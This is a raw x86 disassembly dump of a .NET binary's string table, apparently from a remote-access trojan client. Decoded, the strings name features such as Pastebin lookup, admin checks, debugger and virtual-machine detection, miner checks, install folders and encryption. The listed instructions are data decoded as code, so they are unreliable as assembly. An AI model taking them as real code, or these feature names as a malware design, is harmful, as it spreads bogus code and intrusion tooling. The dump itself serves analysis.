  40852a:	6e                   	outsb  %ds:(%esi),(%dx)
  40852b:	00 63 68             	add    %ah,0x68(%ebx)
  40852e:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  408535:	4d 
  408536:	61                   	popa
  408537:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  40853e:	43                   	inc    %ebx
  40853f:	68 61 69 6e 00       	push   $0x6e6961
  408544:	63 68 61             	arpl   %ebp,0x61(%eax)
  408547:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  40854e:	6f                   	outsl  %ds:(%esi),(%dx)
  40854f:	6d                   	insl   (%dx),%es:(%edi)
  408550:	61                   	popa
  408551:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  408558:	43                   	inc    %ebx
  408559:	75 72                	jne    0x4085cd
  40855b:	72 65                	jb     0x4085c2
  40855d:	6e                   	outsb  %ds:(%esi),(%dx)
  40855e:	74 44                	je     0x4085a4
  408560:	6f                   	outsl  %ds:(%esi),(%dx)
  408561:	6d                   	insl   (%dx),%es:(%edi)
  408562:	61                   	popa
  408563:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  40856a:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  40856e:	00 49 73             	add    %cl,0x73(%ecx)
  408571:	41                   	inc    %ecx
  408572:	64 6d                	fs insl (%dx),%es:(%edi)
  408574:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40857b:	00 47 65             	add    %al,0x65(%edi)
  40857e:	74 46                	je     0x4085c6
  408580:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408587:	57 
  408588:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  40858f:	78 
  408590:	74 65                	je     0x4085f7
  408592:	6e                   	outsb  %ds:(%esi),(%dx)
  408593:	73 69                	jae    0x4085fe
  408595:	6f                   	outsl  %ds:(%esi),(%dx)
  408596:	6e                   	outsb  %ds:(%esi),(%dx)
  408597:	00 67 65             	add    %ah,0x65(%edi)
  40859a:	74 5f                	je     0x4085fb
  40859c:	4f                   	dec    %edi
  40859d:	53                   	push   %ebx
  40859e:	56                   	push   %esi
  40859f:	65 72 73             	gs jb  0x408615
  4085a2:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4085a9:	74 65                	je     0x408610
  4085ab:	6d                   	insl   (%dx),%es:(%edi)
  4085ac:	2e 49                	cs dec %ecx
  4085ae:	4f                   	dec    %edi
  4085af:	2e 43                	cs inc %ebx
  4085b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b2:	6d                   	insl   (%dx),%es:(%edi)
  4085b3:	70 72                	jo     0x408627
  4085b5:	65 73 73             	gs jae 0x40862b
  4085b8:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4085bf:	6c                   	insb   (%dx),%es:(%edi)
  4085c0:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4085c7:	00 53 79             	add    %dl,0x79(%ebx)
  4085ca:	73 74                	jae    0x408640
  4085cc:	65 6d                	gs insl (%dx),%es:(%edi)
  4085ce:	2e 53                	cs push %ebx
  4085d0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4085d4:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4085db:	68 
  4085dc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085de:	74 69                	je     0x408649
  4085e0:	63 61 74             	arpl   %esp,0x74(%ecx)
  4085e3:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4085ea:	74 65                	je     0x408651
  4085ec:	6d                   	insl   (%dx),%es:(%edi)
  4085ed:	2e 52                	cs push %edx
  4085ef:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4085f2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4085f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f8:	00 58 35             	add    %bl,0x35(%eax)
  4085fb:	30 39                	xor    %bh,(%ecx)
  4085fd:	43                   	inc    %ebx
  4085fe:	65 72 74             	gs jb  0x408675
  408601:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408608:	43                   	inc    %ebx
  408609:	6f                   	outsl  %ds:(%esi),(%dx)
  40860a:	6c                   	insb   (%dx),%es:(%edi)
  40860b:	6c                   	insb   (%dx),%es:(%edi)
  40860c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408611:	6e                   	outsb  %ds:(%esi),(%dx)
  408612:	00 4d 61             	add    %cl,0x61(%ebp)
  408615:	6e                   	outsb  %ds:(%esi),(%dx)
  408616:	61                   	popa
  408617:	67 65 6d             	gs insl (%dx),%es:(%di)
  40861a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40861c:	74 4f                	je     0x40866d
  40861e:	62 6a 65             	bound  %ebp,0x65(%edx)
  408621:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  408625:	6c                   	insb   (%dx),%es:(%edi)
  408626:	6c                   	insb   (%dx),%es:(%edi)
  408627:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40862c:	6e                   	outsb  %ds:(%esi),(%dx)
  40862d:	00 43 6c             	add    %al,0x6c(%ebx)
  408630:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  408637:	6e                   	outsb  %ds:(%esi),(%dx)
  408638:	6e                   	outsb  %ds:(%esi),(%dx)
  408639:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40863e:	6e                   	outsb  %ds:(%esi),(%dx)
  40863f:	00 73 65             	add    %dh,0x65(%ebx)
  408642:	74 5f                	je     0x4086a3
  408644:	50                   	push   %eax
  408645:	6f                   	outsl  %ds:(%esi),(%dx)
  408646:	73 69                	jae    0x4086b1
  408648:	74 69                	je     0x4086b3
  40864a:	6f                   	outsl  %ds:(%esi),(%dx)
  40864b:	6e                   	outsb  %ds:(%esi),(%dx)
  40864c:	00 70 6f             	add    %dh,0x6f(%eax)
  40864f:	73 69                	jae    0x4086ba
  408651:	74 69                	je     0x4086bc
  408653:	6f                   	outsl  %ds:(%esi),(%dx)
  408654:	6e                   	outsb  %ds:(%esi),(%dx)
  408655:	00 43 72             	add    %al,0x72(%ebx)
  408658:	79 70                	jns    0x4086ca
  40865a:	74 6f                	je     0x4086cb
  40865c:	67 72 61             	addr16 jb 0x4086c0
  40865f:	70 68                	jo     0x4086c9
  408661:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  408668:	74 69                	je     0x4086d3
  40866a:	6f                   	outsl  %ds:(%esi),(%dx)
  40866b:	6e                   	outsb  %ds:(%esi),(%dx)
  40866c:	00 41 72             	add    %al,0x72(%ecx)
  40866f:	67 75 6d             	addr16 jne 0x4086df
  408672:	65 6e                	outsb  %gs:(%esi),(%dx)
  408674:	74 4e                	je     0x4086c4
  408676:	75 6c                	jne    0x4086e4
  408678:	6c                   	insb   (%dx),%es:(%edi)
  408679:	45                   	inc    %ebp
  40867a:	78 63                	js     0x4086df
  40867c:	65 70 74             	gs jo  0x4086f3
  40867f:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408686:	75 6d                	jne    0x4086f5
  408688:	65 6e                	outsb  %gs:(%esi),(%dx)
  40868a:	74 45                	je     0x4086d1
  40868c:	78 63                	js     0x4086f1
  40868e:	65 70 74             	gs jo  0x408705
  408691:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408698:	6e                   	outsb  %ds:(%esi),(%dx)
  408699:	6f                   	outsl  %ds:(%esi),(%dx)
  40869a:	77 6e                	ja     0x40870a
  40869c:	00 49 6d             	add    %cl,0x6d(%ecx)
  40869f:	61                   	popa
  4086a0:	67 65 43             	addr16 gs inc %ebx
  4086a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4086a4:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4086a9:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086ab:	00 53 65             	add    %dl,0x65(%ebx)
  4086ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4086af:	64 49                	fs dec %ecx
  4086b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086b4:	00 46 69             	add    %al,0x69(%esi)
  4086b7:	6c                   	insb   (%dx),%es:(%edi)
  4086b8:	65 49                	gs dec %ecx
  4086ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4086bb:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086bd:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4086c1:	76 65                	jbe    0x408728
  4086c3:	49                   	dec    %ecx
  4086c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086c7:	00 46 69             	add    %al,0x69(%esi)
  4086ca:	6c                   	insb   (%dx),%es:(%edi)
  4086cb:	65 53                	gs push %ebx
  4086cd:	79 73                	jns    0x408742
  4086cf:	74 65                	je     0x408736
  4086d1:	6d                   	insl   (%dx),%es:(%edi)
  4086d2:	49                   	dec    %ecx
  4086d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086d4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086d6:	00 43 6f             	add    %al,0x6f(%ebx)
  4086d9:	6d                   	insl   (%dx),%es:(%edi)
  4086da:	70 75                	jo     0x408751
  4086dc:	74 65                	je     0x408743
  4086de:	72 49                	jb     0x408729
  4086e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e1:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086e3:	00 43 53             	add    %al,0x53(%ebx)
  4086e6:	68 61 72 70 41       	push   $0x41707261
  4086eb:	72 67                	jb     0x408754
  4086ed:	75 6d                	jne    0x40875c
  4086ef:	65 6e                	outsb  %gs:(%esi),(%dx)
  4086f1:	74 49                	je     0x40873c
  4086f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086f6:	00 73 65             	add    %dh,0x65(%ebx)
  4086f9:	74 5f                	je     0x40875a
  4086fb:	53                   	push   %ebx
  4086fc:	74 61                	je     0x40875f
  4086fe:	72 74                	jb     0x408774
  408700:	49                   	dec    %ecx
  408701:	6e                   	outsb  %ds:(%esi),(%dx)
  408702:	66 6f                	outsw  %ds:(%esi),(%dx)
  408704:	00 50 72             	add    %dl,0x72(%eax)
  408707:	6f                   	outsl  %ds:(%esi),(%dx)
  408708:	63 65 73             	arpl   %esp,0x73(%ebp)
  40870b:	73 53                	jae    0x408760
  40870d:	74 61                	je     0x408770
  40870f:	72 74                	jb     0x408785
  408711:	49                   	dec    %ecx
  408712:	6e                   	outsb  %ds:(%esi),(%dx)
  408713:	66 6f                	outsw  %ds:(%esi),(%dx)
  408715:	00 57 72             	add    %dl,0x72(%edi)
  408718:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  40871f:	50 
  408720:	72 65                	jb     0x408787
  408722:	76 65                	jbe    0x408789
  408724:	6e                   	outsb  %ds:(%esi),(%dx)
  408725:	74 53                	je     0x40877a
  408727:	6c                   	insb   (%dx),%es:(%edi)
  408728:	65 65 70 00          	gs gs jo 0x40872c
  40872c:	5a                   	pop    %edx
  40872d:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408734:	65 6e                	outsb  %gs:(%esi),(%dx)
  408736:	74 41                	je     0x408779
  408738:	70 70                	jo     0x4087aa
  40873a:	00 4d 69             	add    %cl,0x69(%ebp)
  40873d:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408740:	73 6f                	jae    0x4087b1
  408742:	66 74 2e             	data16 je 0x408773
  408745:	43                   	inc    %ebx
  408746:	53                   	push   %ebx
  408747:	68 61 72 70 00       	push   $0x707261
  40874c:	4e                   	dec    %esi
  40874d:	6f                   	outsl  %ds:(%esi),(%dx)
  40874e:	72 6d                	jb     0x4087bd
  408750:	61                   	popa
  408751:	6c                   	insb   (%dx),%es:(%edi)
  408752:	53                   	push   %ebx
  408753:	74 61                	je     0x4087b6
  408755:	72 74                	jb     0x4087cb
  408757:	75 70                	jne    0x4087c9
  408759:	00 53 79             	add    %dl,0x79(%ebx)
  40875c:	73 74                	jae    0x4087d2
  40875e:	65 6d                	gs insl (%dx),%es:(%edi)
  408760:	2e 4c                	cs dec %esp
  408762:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408769:	61                   	popa
  40876a:	72 00                	jb     0x40876c
  40876c:	43                   	inc    %ebx
  40876d:	68 61 72 00 49       	push   $0x49007261
  408772:	6e                   	outsb  %ds:(%esi),(%dx)
  408773:	76 6f                	jbe    0x4087e4
  408775:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408779:	6d                   	insl   (%dx),%es:(%edi)
  40877a:	62 65 72             	bound  %esp,0x72(%ebp)
  40877d:	00 4d 44             	add    %cl,0x44(%ebp)
  408780:	35 43 72 79 70       	xor    $0x70797243,%eax
  408785:	74 6f                	je     0x4087f6
  408787:	53                   	push   %ebx
  408788:	65 72 76             	gs jb  0x408801
  40878b:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408792:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408799:	41 
  40879a:	43                   	inc    %ebx
  40879b:	72 79                	jb     0x408816
  40879d:	70 74                	jo     0x408813
  40879f:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a0:	53                   	push   %ebx
  4087a1:	65 72 76             	gs jb  0x40881a
  4087a4:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4087ab:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4087b2:	73 
  4087b3:	43                   	inc    %ebx
  4087b4:	72 79                	jb     0x40882f
  4087b6:	70 74                	jo     0x40882c
  4087b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b9:	53                   	push   %ebx
  4087ba:	65 72 76             	gs jb  0x408833
  4087bd:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4087c4:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4087cb:	72 
  4087cc:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4087d3:	64 65 72 00          	fs gs jb 0x4087d7
  4087d7:	49                   	dec    %ecx
  4087d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4087d9:	73 74                	jae    0x40884f
  4087db:	61                   	popa
  4087dc:	6c                   	insb   (%dx),%es:(%edi)
  4087dd:	6c                   	insb   (%dx),%es:(%edi)
  4087de:	46                   	inc    %esi
  4087df:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e0:	6c                   	insb   (%dx),%es:(%edi)
  4087e1:	64 65 72 00          	fs gs jb 0x4087e5
  4087e5:	49                   	dec    %ecx
  4087e6:	64 53                	fs push %ebx
  4087e8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4087ea:	64 65 72 00          	fs gs jb 0x4087ee
  4087ee:	73 65                	jae    0x408855
  4087f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4087f1:	64 65 72 00          	fs gs jb 0x4087f5
  4087f5:	4d                   	dec    %ebp
  4087f6:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4087fd:	74 2e                	je     0x40882d
  4087ff:	43                   	inc    %ebx
  408800:	53                   	push   %ebx
  408801:	68 61 72 70 2e       	push   $0x2e707261
  408806:	52                   	push   %edx
  408807:	75 6e                	jne    0x408877
  408809:	74 69                	je     0x408874
  40880b:	6d                   	insl   (%dx),%es:(%edi)
  40880c:	65 42                	gs inc %edx
  40880e:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408815:	61                   	popa
  408816:	6c                   	insb   (%dx),%es:(%edi)
  408817:	6c                   	insb   (%dx),%es:(%edi)
  408818:	53                   	push   %ebx
  408819:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408820:	65 
  408821:	72 00                	jb     0x408823
  408823:	47                   	inc    %edi
  408824:	65 74 45             	gs je  0x40886c
  408827:	6e                   	outsb  %ds:(%esi),(%dx)
  408828:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40882b:	65 72 00             	gs jb  0x40882e
  40882e:	67 65 74 5f          	addr16 gs je 0x408891
  408832:	42                   	inc    %edx
  408833:	75 66                	jne    0x40889b
  408835:	66 65 72 00          	data16 gs jb 0x408839
  408839:	73 65                	jae    0x4088a0
  40883b:	74 5f                	je     0x40889c
  40883d:	42                   	inc    %edx
  40883e:	75 66                	jne    0x4088a6
  408840:	66 65 72 00          	data16 gs jb 0x408844
  408844:	57                   	push   %edi
  408845:	72 69                	jb     0x4088b0
  408847:	74 65                	je     0x4088ae
  408849:	49                   	dec    %ecx
  40884a:	6e                   	outsb  %ds:(%esi),(%dx)
  40884b:	74 65                	je     0x4088b2
  40884d:	67 65 72 00          	addr16 gs jb 0x408851
  408851:	67 65 74 5f          	addr16 gs je 0x4088b4
  408855:	41                   	inc    %ecx
  408856:	73 49                	jae    0x4088a1
  408858:	6e                   	outsb  %ds:(%esi),(%dx)
  408859:	74 65                	je     0x4088c0
  40885b:	67 65 72 00          	addr16 gs jb 0x40885f
  40885f:	73 65                	jae    0x4088c6
  408861:	74 5f                	je     0x4088c2
  408863:	41                   	inc    %ecx
  408864:	73 49                	jae    0x4088af
  408866:	6e                   	outsb  %ds:(%esi),(%dx)
  408867:	74 65                	je     0x4088ce
  408869:	67 65 72 00          	addr16 gs jb 0x40886d
  40886d:	47                   	inc    %edi
  40886e:	65 74 41             	gs je  0x4088b2
  408871:	73 49                	jae    0x4088bc
  408873:	6e                   	outsb  %ds:(%esi),(%dx)
  408874:	74 65                	je     0x4088db
  408876:	67 65 72 00          	addr16 gs jb 0x40887a
  40887a:	53                   	push   %ebx
  40887b:	65 74 41             	gs je  0x4088bf
  40887e:	73 49                	jae    0x4088c9
  408880:	6e                   	outsb  %ds:(%esi),(%dx)
  408881:	74 65                	je     0x4088e8
  408883:	67 65 72 00          	addr16 gs jb 0x408887
  408887:	44                   	inc    %esp
  408888:	65 74 65             	gs je  0x4088f0
  40888b:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  40888f:	62 75 67             	bound  %esi,0x67(%ebp)
  408892:	67 65 72 00          	addr16 gs jb 0x408896
  408896:	4d                   	dec    %ebp
  408897:	61                   	popa
  408898:	6e                   	outsb  %ds:(%esi),(%dx)
  408899:	61                   	popa
  40889a:	67 65 6d             	gs insl (%dx),%es:(%di)
  40889d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40889f:	74 4f                	je     0x4088f0
  4088a1:	62 6a 65             	bound  %ebp,0x65(%edx)
  4088a4:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  4088a8:	61                   	popa
  4088a9:	72 63                	jb     0x40890e
  4088ab:	68 65 72 00 53       	push   $0x53007265
  4088b0:	65 73 73             	gs jae 0x408926
  4088b3:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4088ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4088bb:	67 45                	addr16 inc %ebp
  4088bd:	76 65                	jbe    0x408924
  4088bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c0:	74 48                	je     0x40890a
  4088c2:	61                   	popa
  4088c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c4:	64 6c                	fs insb (%dx),%es:(%edi)
  4088c6:	65 72 00             	gs jb  0x4088c9
  4088c9:	54                   	push   %esp
  4088ca:	69 6d 65 72 00 43 68 	imul   $0x68430072,0x65(%ebp),%ebp
  4088d1:	65 63 6b 4d          	arpl   %ebp,%gs:0x4d(%ebx)
  4088d5:	69 6e 65 72 00 6f 77 	imul   $0x776f0072,0x65(%esi),%ebp
  4088dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4088dd:	65 72 00             	gs jb  0x4088e0
  4088e0:	43                   	inc    %ebx
  4088e1:	6c                   	insb   (%dx),%es:(%edi)
  4088e2:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  4088e9:	6c                   	insb   (%dx),%es:(%edi)
  4088ea:	70 65                	jo     0x408951
  4088ec:	72 00                	jb     0x4088ee
  4088ee:	54                   	push   %esp
  4088ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4088f0:	55                   	push   %ebp
  4088f1:	70 70                	jo     0x408963
  4088f3:	65 72 00             	gs jb  0x4088f6
  4088f6:	44                   	inc    %esp
  4088f7:	65 74 65             	gs je  0x40895f
  4088fa:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  4088fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ff:	75 66                	jne    0x408967
  408901:	61                   	popa
  408902:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408906:	65 72 00             	gs jb  0x408909
  408909:	43                   	inc    %ebx
  40890a:	75 72                	jne    0x40897e
  40890c:	72 65                	jb     0x408973
  40890e:	6e                   	outsb  %ds:(%esi),(%dx)
  40890f:	74 55                	je     0x408966
  408911:	73 65                	jae    0x408978
  408913:	72 00                	jb     0x408915
  408915:	53                   	push   %ebx
  408916:	74 72                	je     0x40898a
  408918:	65 61                	gs popa
  40891a:	6d                   	insl   (%dx),%es:(%edi)
  40891b:	57                   	push   %edi
  40891c:	72 69                	jb     0x408987
  40891e:	74 65                	je     0x408985
  408920:	72 00                	jb     0x408922
  408922:	54                   	push   %esp
  408923:	65 78 74             	gs js  0x40899a
  408926:	57                   	push   %edi
  408927:	72 69                	jb     0x408992
  408929:	74 65                	je     0x408990
  40892b:	72 00                	jb     0x40892d
  40892d:	45                   	inc    %ebp
  40892e:	6e                   	outsb  %ds:(%esi),(%dx)
  40892f:	74 65                	je     0x408996
  408931:	72 00                	jb     0x408933
  408933:	42                   	inc    %edx
  408934:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40893b:	72 
  40893c:	74 65                	je     0x4089a3
  40893e:	72 00                	jb     0x408940
  408940:	54                   	push   %esp
  408941:	6f                   	outsl  %ds:(%esi),(%dx)
  408942:	4c                   	dec    %esp
  408943:	6f                   	outsl  %ds:(%esi),(%dx)
  408944:	77 65                	ja     0x4089ab
  408946:	72 00                	jb     0x408948
  408948:	45                   	inc    %ebp
  408949:	72 72                	jb     0x4089bd
  40894b:	6f                   	outsl  %ds:(%esi),(%dx)
  40894c:	72 00                	jb     0x40894e
  40894e:	49                   	dec    %ecx
  40894f:	45                   	inc    %ebp
  408950:	6e                   	outsb  %ds:(%esi),(%dx)
  408951:	75 6d                	jne    0x4089c0
  408953:	65 72 61             	gs jb  0x4089b7
  408956:	74 6f                	je     0x4089c7
  408958:	72 00                	jb     0x40895a
  40895a:	4d                   	dec    %ebp
  40895b:	61                   	popa
  40895c:	6e                   	outsb  %ds:(%esi),(%dx)
  40895d:	61                   	popa
  40895e:	67 65 6d             	gs insl (%dx),%es:(%di)
  408961:	65 6e                	outsb  %gs:(%esi),(%dx)
  408963:	74 4f                	je     0x4089b4
  408965:	62 6a 65             	bound  %ebp,0x65(%edx)
  408968:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  40896c:	75 6d                	jne    0x4089db
  40896e:	65 72 61             	gs jb  0x4089d2
  408971:	74 6f                	je     0x4089e2
  408973:	72 00                	jb     0x408975
  408975:	53                   	push   %ebx
  408976:	79 73                	jns    0x4089eb
  408978:	74 65                	je     0x4089df
  40897a:	6d                   	insl   (%dx),%es:(%edi)
  40897b:	2e 43                	cs inc %ebx
  40897d:	6f                   	outsl  %ds:(%esi),(%dx)
  40897e:	6c                   	insb   (%dx),%es:(%edi)
  40897f:	6c                   	insb   (%dx),%es:(%edi)
  408980:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408985:	6e                   	outsb  %ds:(%esi),(%dx)
  408986:	73 2e                	jae    0x4089b6
  408988:	49                   	dec    %ecx
  408989:	45                   	inc    %ebp
  40898a:	6e                   	outsb  %ds:(%esi),(%dx)
  40898b:	75 6d                	jne    0x4089fa
  40898d:	65 72 61             	gs jb  0x4089f1
  408990:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408994:	47                   	inc    %edi
  408995:	65 74 45             	gs je  0x4089dd
  408998:	6e                   	outsb  %ds:(%esi),(%dx)
  408999:	75 6d                	jne    0x408a08
  40899b:	65 72 61             	gs jb  0x4089ff
  40899e:	74 6f                	je     0x408a0f
  4089a0:	72 00                	jb     0x4089a2
  4089a2:	41                   	inc    %ecx
  4089a3:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4089a7:	61                   	popa
  4089a8:	74 6f                	je     0x408a19
  4089aa:	72 00                	jb     0x4089ac
  4089ac:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4089b1:	00 2e                	add    %ch,(%esi)
  4089b3:	63 63 74             	arpl   %esp,0x74(%ebx)
  4089b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4089b7:	72 00                	jb     0x4089b9
  4089b9:	4d                   	dec    %ebp
  4089ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4089bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bc:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  4089c3:	65 
  4089c4:	61                   	popa
  4089c5:	74 65                	je     0x408a2c
  4089c7:	44                   	inc    %esp
  4089c8:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4089cc:	70 74                	jo     0x408a42
  4089ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cf:	72 00                	jb     0x4089d1
  4089d1:	43                   	inc    %ebx
  4089d2:	72 65                	jb     0x408a39
  4089d4:	61                   	popa
  4089d5:	74 65                	je     0x408a3c
  4089d7:	45                   	inc    %ebp
  4089d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d9:	63 72 79             	arpl   %esi,0x79(%edx)
  4089dc:	70 74                	jo     0x408a52
  4089de:	6f                   	outsl  %ds:(%esi),(%dx)
  4089df:	72 00                	jb     0x4089e1
  4089e1:	49                   	dec    %ecx
  4089e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e3:	74 50                	je     0x408a35
  4089e5:	74 72                	je     0x408a59
  4089e7:	00 53 79             	add    %dl,0x79(%ebx)
  4089ea:	73 74                	jae    0x408a60
  4089ec:	65 6d                	gs insl (%dx),%es:(%edi)
  4089ee:	2e 44                	cs inc %esp
  4089f0:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4089f7:	69 63 73 00 4d 65 74 	imul   $0x74654d00,0x73(%ebx),%esp
  4089fe:	68 6f 64 73 00       	push   $0x73646f
  408a03:	4d                   	dec    %ebp
  408a04:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408a0b:	74 2e                	je     0x408a3b
  408a0d:	56                   	push   %esi
  408a0e:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408a15:	73 69                	jae    0x408a80
  408a17:	63 2e                	arpl   %ebp,(%esi)
  408a19:	44                   	inc    %esp
  408a1a:	65 76 69             	gs jbe 0x408a86
  408a1d:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a20:	00 53 79             	add    %dl,0x79(%ebx)
  408a23:	73 74                	jae    0x408a99
  408a25:	65 6d                	gs insl (%dx),%es:(%edi)
  408a27:	2e 52                	cs push %edx
  408a29:	75 6e                	jne    0x408a99
  408a2b:	74 69                	je     0x408a96
  408a2d:	6d                   	insl   (%dx),%es:(%edi)
  408a2e:	65 2e 49             	gs cs dec %ecx
  408a31:	6e                   	outsb  %ds:(%esi),(%dx)
  408a32:	74 65                	je     0x408a99
  408a34:	72 6f                	jb     0x408aa5
  408a36:	70 53                	jo     0x408a8b
  408a38:	65 72 76             	gs jb  0x408ab1
  408a3b:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408a42:	73 74                	jae    0x408ab8
  408a44:	65 6d                	gs insl (%dx),%es:(%edi)
  408a46:	2e 52                	cs push %edx
  408a48:	75 6e                	jne    0x408ab8
  408a4a:	74 69                	je     0x408ab5
  408a4c:	6d                   	insl   (%dx),%es:(%edi)
  408a4d:	65 2e 43             	gs cs inc %ebx
  408a50:	6f                   	outsl  %ds:(%esi),(%dx)
  408a51:	6d                   	insl   (%dx),%es:(%edi)
  408a52:	70 69                	jo     0x408abd
  408a54:	6c                   	insb   (%dx),%es:(%edi)
  408a55:	65 72 53             	gs jb  0x408aab
  408a58:	65 72 76             	gs jb  0x408ad1
  408a5b:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408a62:	62 75 67             	bound  %esi,0x67(%ebp)
  408a65:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408a6c:	65 
  408a6d:	73 00                	jae    0x408a6f
